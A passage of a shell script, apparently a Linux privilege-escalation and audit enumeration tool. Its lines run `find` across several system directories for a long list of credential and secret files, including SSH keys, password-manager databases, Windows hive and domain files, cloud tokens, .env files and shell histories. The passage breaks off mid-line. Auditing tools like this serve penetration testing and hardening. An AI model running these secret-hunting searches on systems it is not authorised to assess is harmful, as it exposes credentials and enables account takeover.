  1155	  FIND_HOMESEARCH=`eval_bckgrd "find $HOMESEARCH -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"ssh*config\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"webserver_config.py\" -o -name \"AzureRMContext.json\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1156	  FIND_LIB=`eval_bckgrd "find ${ROOT_FOLDER}lib -name \"rocketchat.service\" -o -name \"*.socket\" -o -name \"*.service\" -o -name \"log4j-core*.jar\" -o -name \"*.timer\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1157	  FIND_LIB32=`eval_bckgrd "find ${ROOT_FOLDER}lib32 -name \"*.socket\" -o -name \"log4j-core*.jar\" -o -name \"*.timer\" -o -name \"*.service\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1158	  FIND_LIB64=`eval_bckgrd "find ${ROOT_FOLDER}lib64 -name \"*.socket\" -o -name \"log4j-core*.jar\" -o -name \"*.timer\" -o -name \"*.service\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1159	  FIND_MEDIA=`eval_bckgrd "find ${ROOT_FOLDER}media -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"AzureRMContext.json\" -o -name \"webserver_config.py\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1160	  FIND_MNT=`eval_bckgrd "find ${ROOT_FOLDER}mnt -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"sess_*\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"webserver_config.py\" -o -name \"AzureRMContext.json\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1161	  FIND_OPT=`eval_bckgrd "find ${ROOT_FOLDER}opt -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o -name \"*.vmdk\" -o -name \"autounattend.xml\" -o -name \"log4j-core*.jar\" -o -name \"access_tokens.db\" -o -name \".roadtools_auth\" -o -name \"anaconda-ks.cfg\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"cloud.cfg\" -o -name \"atlantis.db\" -o -name \"rocketchat.service\" -o -name \"autologin.conf\" -o -name \".git\" -o -name \"*vnc*.txt\" -o -name \"*.service\" -o -name \"software\" -o -name \"firebase-tools.json\" -o -name \"zabbix_server.conf\" -o -name \"AppEvent.Evt\" -o -name \"backup\" -o -name \"SAM\" -o -name \"redis.conf\" -o -name \"legacy_credentials.db\" -o -name \"authorized_keys\" -o -name \"*_history*\" -o -name \"authorized_hosts\" -o -name \"pwd.ibd\" -o -name \"*.gpg\" -o -name \"pgsql.conf\" -o -name \"kibana.y*ml\" -o -name \"wcx_ftp.ini\" -o -name \"groups.xml\" -o -name \"kcpassword\" -o -name \"*.der\" -o -name \"gvm-tools.conf\" -o -name \"Dockerfile\" -o -name \"iis6.log\" -o -name \"FreeSSHDservice.ini\" -o -name \"https.conf\" -o -name \"*.pfx\" -o -name \"password*.ibd\" -o -name \"*vnc*.xml\" -o -name \"wsl.exe\" -o -name \"*.ovpn\" -o -name \"sssd.conf\" -o -name \".Xauthority\" -o -name \"glusterfs.pem\" -o -name \"id_dsa*\" -o -name \".wgetrc\" -o -name \"setupinfo\" -o -name \"*.db\" -o -name \"api_key\" -o -name \"known_hosts\" -o -name \"appcmd.exe\" -o -name \"pagefile.sys\" -o -name \"wp-config.php\" -o -name \"*.csr\" -o -name \"gitlab.yml\" -o -name \"*config*.php\" -o -name \"frakti.sock\" -o -name \"creds*\" -o -name \"grafana.ini\" -o -name \".git-credentials\" -o -name \"sysprep.inf\" -o -name \"docker.sock\" -o -name \".erlang.cookie\" -o -name \".github\" -o -name \"Ntds.dit\" -o -name \".credentials.json\" -o -name \"vsftpd.conf\" -o -name \"hudson.util.Secret\" -o -name \"index.dat\" -o -name \"database.php\" -o -name \"access_tokens.json\" -o -name \"Elastix.conf\" -o -name \"adc.json\" -o -name \"credentials.xml\" -o -name \"elasticsearch.y*ml\" -o -name \"passwd.ibd\" -o -name \"*.tf\" -o -name \"settings.php\" -o -name \"filezilla.xml\" -o -name \".boto\" -o -name \"docker-compose.yml\" -o -name \"glusterfs.key\" -o -name \"amportal.conf\" -o -name \"hostapd.conf\" -o -name \"credentials.db\" -o -name \"mosquitto.conf\" -o -name \"KeePass.enforced*\" -o -name \"*.ftpconfig\" -o -name \".k5login\" -o -name \"bash.exe\" -o -name \"server.xml\" -o -name \"*.crt\" -o -name \"storage.php\" -o -name \"debian.cnf\" -o -name \"dockershim.sock\" -o -name \"KeePass.ini\" -o -name \"mongod*.conf\" -o -name \"printers.xml\" -o -name \"ws_ftp.ini\" -o -name \"sitemanager.xml\" -o -name \".ldaprc\" -o -name \"tomcat-users.xml\" -o -name \"rsyncd.secrets\" -o -name \"secrets.ldb\" -o -name \"backups\" -o -name \"*password*\" -o -name \"id_rsa*\" -o -name \"zabbix_agentd.conf\" -o -name \"*.sqlite\" -o -name \"accessTokens.json\" -o -name \"racoon.conf\" -o -name \"web*.config\" -o -name \"winscp.ini\" -o -name \"jetty-realm.properties\" -o -name \"rpcd\" -o -name \"pg_hba.conf\" -o -name \"ntuser.dat\" -o -name \"pgadmin*.db\" -o -name \"*.keystore\" -o -name \"*.jks\" -o -name \"ftp.ini\" -o -name \"datasources.xml\" -o -name \"system.sav\" -o -name \"fat.config\" -o -name \"snmpd.conf\" -o -name \"*.rdg\" -o -name \"crio.sock\" -o -name \"*.viminfo\" -o -name \"glusterfs.ca\" -o -name \"*vnc*.ini\" -o -name \"*.keytab\" -o -name \"scheduledtasks.xml\" -o -name \"000-default.conf\" -o -name \"sip.conf\" -o -name \"*.vhdx\" -o -name \"secrets.yml\" -o -name \"vault-ssh-helper.hcl\" -o -name \"php.ini\" -o -name \"mariadb.cnf\" -o -name \"*.gnupg\" -o -name \"containerd.sock\" -o -name \"unattend.inf\" -o -name \"*.socket\" -o -name \"config.php\" -o -name \"*.keyring\" -o -name \"SYSTEM\" -o -name \".secrets.mkey\" -o -name \"*credential*\" -o -name \".rhosts\" -o -name \".lesshst\" -o -name \"*.tfstate\" -o -name \"httpd.conf\" -o -name \"unattend.xml\" -o -name \"fastcgi_params\" -o -name \"error.log\" -o -name \"airflow.cfg\" -o -name \"passbolt.php\" -o -name \"AzureRMContext.json\" -o -name \"webserver_config.py\" -o -name \"protecteduserkey.bin\" -o -name \"ffftp.ini\" -o -name \".bashrc\" -o -name \"SecEvent.Evt\" -o -name \"docker.socket\" -o -name \"sentry.conf.py\" -o -name \".plan\" -o -name \".htpasswd\" -o -name \"FreePBX.conf\" -o -name \"plum.sqlite\" -o -name \"*.pem\" -o -name \"*.cer\" -o -name \"*.vhd\" -o -name \"unattend.txt\" -o -name \"postgresql.conf\" -o -name \"krb5cc_*\" -o -name \"snyk.config.json\" -o -name \"security.sav\" -o -name \"bitcoin.conf\" -o -name \"rktlet.sock\" -o -name \"default.sav\" -o -name \".gitconfig\" -o -name \"rsyncd.conf\" -o -name \".recently-used.xbel\" -o -name \"ipsec.secrets\" -o -name \".env*\" -o -name \"*.timer\" -o -name \"my.cnf\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  1162	  FIND_PRIVATE=`eval_bckgrd "find ${ROOT_FOLDER}private -name \"https-xampp.conf\" -o -name \"gitlab.rm\" -o -name \".flyrc\" -o -name \"*.sqlite3\" -o -name \"recentservers.xml\" -o -name \"psk.txt\" -o -name \"access.log\" -o -name \"software.sav\" -o -name \".profile\" -o -name \"*.psk\" -o -name \"unattended.xml\" -o -name \"*.swp\" -o -name \"scclient.exe\" -o -name \"hosts.equiv\" -o -name \"*.key\" -o -name \".msmtprc\" -o -name \"*.kdbx\" -o -name \"config.xml\" -o -name \"RDCMan.settings\" -o -name \"drives.xml\" -o -name \"*.p12\" -o -name \"supervisord.conf\" -o -name \"*vnc*.c*nf*\" -o -name \".google_authenticator\" -o -name \".sudo_as_admin_successful\" -o -name \"passwd\" -o -name \"*.pgp\" -o -name \"KeePass.config*\" -o -name \"nginx.conf\" -o -name \"cesi.conf\" -o -name \"mysqld.cnf\" -o -name \"krb5.conf\" -o -name \"TokenCache.dat\" -o -name \"snyk.json\" -o -name \"master.key\" -o -name \"setupinfo.bak\" -o -name \"azureProfile.json\" -o -name \"smb.conf\" -o -name \"NetSetup.log\" -o -name \"pgadmin4.db\" -o -name \"sites.ini\" -o -name \"db.php\" -o -name \".vault-token\" -o -name \"ftp.config\" -o -name \".pypirc\" -o -name \"my.ini\" -o -name \"autologin\" -o -name \"ipsec.conf\" -o -name \"ddclient.conf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kadm5.acl\" -o 